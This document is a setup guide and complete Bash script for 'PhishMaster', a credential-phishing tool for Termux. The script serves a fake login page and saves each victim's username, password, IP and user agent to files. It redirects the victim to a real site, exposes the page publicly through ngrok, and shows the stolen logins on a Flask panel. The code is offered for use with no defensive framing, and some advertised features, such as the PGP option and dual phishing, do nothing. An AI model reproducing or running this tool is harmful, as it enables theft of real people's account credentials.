# Termux-Dual-Phishing-Script-with-PGP-and-Multi-Capture-Panel

pkg update && pkg upgrade -y
pkg install php curl openssh git python gnupg -y
pip install pgpy requests


git clone https://github.com/your-repo/termux-phishing-tool.git
cd termux-phishing-tool


Master code
#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
CONFIG_FILE="phishmaster.config"
LOG_DIR="logs"
CAPTURE_DIR="captures"
PGP_KEYS_DIR="pgp_keys"

# Initialize directories
mkdir -p {$LOG_DIR,$CAPTURE_DIR,$PGP_KEYS_DIR}

# Load configuration
load_config() {
    if [ -f "$CONFIG_FILE" ]; then
        source "$CONFIG_FILE"
    else
        # Default configuration
        PHISHING_URL=""
        DUAL_PHISHING_ENABLED="false"
        SECONDARY_URL=""
        PGP_ENABLED="false"
        PGP_PUBLIC_KEY=""
        PGP_PRIVATE_KEY=""
        MULTI_CAPTURE="true"
        SAVE_LOGS="true"
        AUTOSTART="false"
    fi
}

# Save configuration
save_config() {
    echo "# PhishMaster Configuration" > "$CONFIG_FILE"
    echo "PHISHING_URL=\"$PHISHING_URL\"" >> "$CONFIG_FILE"
    echo "DUAL_PHISHING_ENABLED=\"$DUAL_PHISHING_ENABLED\"" >> "$CONFIG_FILE"
    echo "SECONDARY_URL=\"$SECONDARY_URL\"" >> "$CONFIG_FILE"
    echo "PGP_ENABLED=\"$PGP_ENABLED\"" >> "$CONFIG_FILE"
    echo "PGP_PUBLIC_KEY=\"$PGP_PUBLIC_KEY\"" >> "$CONFIG_FILE"
    echo "PGP_PRIVATE_KEY=\"$PGP_PRIVATE_KEY\"" >> "$CONFIG_FILE"
    echo "MULTI_CAPTURE=\"$MULTI_CAPTURE\"" >> "$CONFIG_FILE"
    echo "SAVE_LOGS=\"$SAVE_LOGS\"" >> "$CONFIG_FILE"
    echo "AUTOSTART=\"$AUTOSTART\"" >> "$CONFIG_FILE"
}

# Generate PGP keys
generate_pgp_keys() {
    echo -e "${YELLOW}[*] Generating PGP keys...${NC}"
    gpg --gen-key --batch <<EOF
    Key-Type: RSA
    Key-Length: 2048
    Subkey-Type: RSA
    Subkey-Length: 2048
    Name-Real: PhishMaster
    Name-Email: phishmaster@example.com
    Expire-Date: 0
    %commit
EOF
    
    # Export keys
    gpg --export -a "PhishMaster" > "$PGP_KEYS_DIR/public.key"
    gpg --export-secret-key -a "PhishMaster" > "$PGP_KEYS_DIR/private.key"
    
    PGP_PUBLIC_KEY="$PGP_KEYS_DIR/public.key"
    PGP_PRIVATE_KEY="$PGP_KEYS_DIR/private.key"
    PGP_ENABLED="true"
    
    echo -e "${GREEN}[+] PGP keys generated and saved to $PGP_KEYS_DIR/${NC}"
}

# Start phishing server
start_phishing() {
    echo -e "${YELLOW}[*] Starting phishing server...${NC}"
    
    # Create simple phishing page
    create_phishing_page
    
    # Start PHP server
    php -S 127.0.0.1:8080 -t . > /dev/null 2>&1 &
    SERVER_PID=$!
    
    # Start ngrok for public access
    echo -e "${YELLOW}[*] Starting ngrok...${NC}"
    termux-chroot ./ngrok http 8080 > /dev/null 2>&1 &
    NGROK_PID=$!
    
    sleep 5 # Wait for ngrok to initialize
    
    # Get public URL
    PUBLIC_URL=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
    
    echo -e "${GREEN}[+] Phishing server running at: ${PUBLIC_URL}${NC}"
    echo -e "${YELLOW}[!] Press Ctrl+C to stop the server${NC}"
    
    # Start capture panel
    if [ "$MULTI_CAPTURE" = "true" ]; then
        start_capture_panel
    fi
    
    wait $SERVER_PID
}

# Create phishing page
create_phishing_page() {
    cat > index.html <<EOF
<!DOCTYPE html>
<html>
<head>
    <title>Login Page</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f5f5f5; }
        .login-form { background: white; width: 300px; margin: 100px auto; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 10px; margin: 8px 0; box-sizing: border-box; }
        button { background-color: #4CAF50; color: white; padding: 10px; border: none; width: 100%; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-form">
        <h2>Sign In</h2>
        <form action="capture.php" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
EOF

    cat > capture.php <<EOF
<?php
\$data = [
    'username' => \$_POST['username'],
    'password' => \$_POST['password'],
    'ip' => \$_SERVER['REMOTE_ADDR'],
    'user_agent' => \$_SERVER['HTTP_USER_AGENT'],
    'timestamp' => date('Y-m-d H:i:s')
];

file_put_contents('captures/login_' . time() . '.txt', print_r(\$data, true));

// Redirect to real site for dual phishing
header('Location: $PHISHING_URL');
exit;
?>
EOF
}

# Start capture panel
start_capture_panel() {
    echo -e "${YELLOW}[*] Starting multi-capture panel...${NC}"
    python3 - <<EOF &
import os
import time
from flask import Flask, render_template_string

app = Flask(__name__)

CAPTURE_DIR = "$CAPTURE_DIR"

@app.route('/')
def dashboard():
    captures = []
    for filename in os.listdir(CAPTURE_DIR):
        if filename.startswith('login_') and filename.endswith('.txt'):
            with open(os.path.join(CAPTURE_DIR, filename), 'r') as f:
                content = f.read()
            captures.append({'filename': filename, 'content': content})
    
    template = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Capture Panel</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            .capture { background: #f9f9f9; padding: 15px; margin-bottom: 10px; border-radius: 5px; }
            pre { white-space: pre-wrap; }
        </style>
    </head>
    <body>
        <h1>Captured Data</h1>
        {% for capture in captures %}
        <div class="capture">
            <h3>{{ capture.filename }}</h3>
            <pre>{{ capture.content }}</pre>
        </div>
        {% endfor %}
    </body>
    </html>
    '''
    return render_template_string(template, captures=captures)

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
EOF

    FLASK_PID=$!
    echo -e "${GREEN}[+] Capture panel running at: http://127.0.0.1:5000/${NC}"
}

# Main menu
main_menu() {
    while true; do
        clear
        echo -e "${BLUE}"
        echo "  ____  _     _     _       __  __           _               "
        echo " |  _ \| |__ (_)___| |__   |  \/  | ___   __| | ___ _ __ ___ "
        echo " | |_) | '_ \| / __| '_ \  | |\/| |/ _ \ / _\` |/ _ \ '__/ __|"
        echo " |  __/| | | | \__ \ | | | | |  | | (_) | (_| |  __/ |  \__ \\"
        echo " |_|   |_| |_|_|___/_| |_| |_|  |_|\___/ \__,_|\___|_|  |___/"
        echo -e "${NC}"
        echo -e "${GREEN}PhishMaster - Advanced Phishing Tool for Termux${NC}"
        echo -e "============================================="
        echo -e "1. Configure Phishing URL"
        echo -e "2. Enable/Disable Dual Phishing"
        echo -e "3. PGP Settings"
        echo -e "4. Multi-Capture Settings"
        echo -e "5. Start Phishing Attack"
        echo -e "6. View Captured Data"
        echo -e "7. Exit"
        echo -e "============================================="
        
        read -p "Select an option: " choice
        
        case $choice in
            1)
                read -p "Enter primary phishing URL: " PHISHING_URL
                save_config
                ;;
            2)
                if [ "$DUAL_PHISHING_ENABLED" = "false" ]; then
                    read -p "Enter secondary phishing URL: " SECONDARY_URL
                    DUAL_PHISHING_ENABLED="true"
                    echo -e "${GREEN}[+] Dual phishing enabled${NC}"
                else
                    DUAL_PHISHING_ENABLED="false"
                    echo -e "${YELLOW}[-] Dual phishing disabled${NC}"
                fi
                save_config
                ;;
            3)
                pgp_menu
                ;;
            4)
                if [ "$MULTI_CAPTURE" = "false" ]; then
                    MULTI_CAPTURE="true"
                    echo -e "${GREEN}[+] Multi-capture enabled${NC}"
                else
                    MULTI_CAPTURE="false"
                    echo -e "${YELLOW}[-] Multi-capture disabled${NC}"
                fi
                save_config
                ;;
            5)
                if [ -z "$PHISHING_URL" ]; then
                    echo -e "${RED}[!] Please configure phishing URL first${NC}"
                    sleep 2
                else
                    start_phishing
                fi
                ;;
            6)
                view_captured_data
                ;;
            7)
                echo -e "${YELLOW}[*] Exiting...${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Invalid option${NC}"
                sleep 1
                ;;
        esac
    done
}

# PGP menu
pgp_menu() {
    while true; do
        clear
        echo -e "${BLUE}PGP Settings${NC}"
        echo -e "============"
        echo -e "1. Generate PGP Keys"
        echo -e "2. Import Public Key"
        echo -e "3. Import Private Key"
        echo -e "4. Enable/Disable PGP"
        echo -e "5. Back to Main Menu"
        echo -e "============"
        
        read -p "Select an option: " choice
        
        case $choice in
            1)
                generate_pgp_keys
                save_config
                ;;
            2)
                read -p "Enter path to public key: " key_path
                if [ -f "$key_path" ]; then
                    cp "$key_path" "$PGP_KEYS_DIR/public.key"
                    PGP_PUBLIC_KEY="$PGP_KEYS_DIR/public.key"
                    echo -e "${GREEN}[+] Public key imported${NC}"
                    save_config
                else
                    echo -e "${RED}[!] File not found${NC}"
                fi
                ;;
            3)
                read -p "Enter path to private key: " key_path
                if [ -f "$key_path" ]; then
                    cp "$key_path" "$PGP_KEYS_DIR/private.key"
                    PGP_PRIVATE_KEY="$PGP_KEYS_DIR/private.key"
                    echo -e "${GREEN}[+] Private key imported${NC}"
                    save_config
                else
                    echo -e "${RED}[!] File not found${NC}"
                fi
                ;;
            4)
                if [ "$PGP_ENABLED" = "false" ]; then
                    if [ -f "$PGP_PUBLIC_KEY" ] && [ -f "$PGP_PRIVATE_KEY" ]; then
                        PGP_ENABLED="true"
                        echo -e "${GREEN}[+] PGP enabled${NC}"
                    else
                        echo -e "${RED}[!] PGP keys not found. Please generate or import keys first.${NC}"
                    fi
                else
                    PGP_ENABLED="false"
                    echo -e "${YELLOW}[-] PGP disabled${NC}"
                fi
                save_config
                ;;
            5)
                return
                ;;
            *)
                echo -e "${RED}[!] Invalid option${NC}"
                sleep 1
                ;;
        esac
    done
}

# View captured data
view_captured_data() {
    echo -e "${YELLOW}[*] Captured Data:${NC}"
    echo -e "=================="
    
    if [ -z "$(ls -A $CAPTURE_DIR)" ]; then
        echo -e "${RED}No captured data found${NC}"
    else
        for file in $CAPTURE_DIR/*; do
            echo -e "${BLUE}File: $file${NC}"
            cat "$file"
            echo -e "=================="
        done
    fi
    
    read -p "Press Enter to continue..."
}

# Main execution
load_config
main_menu

